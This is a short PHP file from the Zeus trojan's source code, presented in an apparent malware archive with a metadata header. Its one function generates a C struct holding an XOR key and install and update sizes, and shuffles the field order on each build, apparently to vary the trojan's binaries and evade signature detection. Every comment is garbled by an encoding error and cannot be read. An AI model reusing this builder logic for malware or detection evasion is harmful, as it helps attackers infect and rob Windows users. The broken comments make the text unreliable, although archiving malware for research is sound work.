/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
<?php
///////////////////////////////////////////////////////////////////////////////////////////////////
// ��������� ��������� INSTALLDATA.
///////////////////////////////////////////////////////////////////////////////////////////////////  

/*  
  ��������� ��������� BASECONFIG.

  Return - ���������� h-�����.
*/
function generateInstallData()
{
  $vars = array
  (
    "DWORD xorKey;      //���� ����������.",
    "DWORD installSize; //������ CoreInstall::_install().",
    "DWORD updateSize;  //������ CoreInstall::_update()."
  );

  //������������ ��������.
  shuffle($vars);

  //��������� ����� ������ ��������� ���������, ����������� ������.
  $outputStruct = implode("\r\n  ", $vars);

  //�������.
  return "typedef struct\r\n{\r\n  {$outputStruct}\r\n}INSTALLDATA;\r\n";
}
?>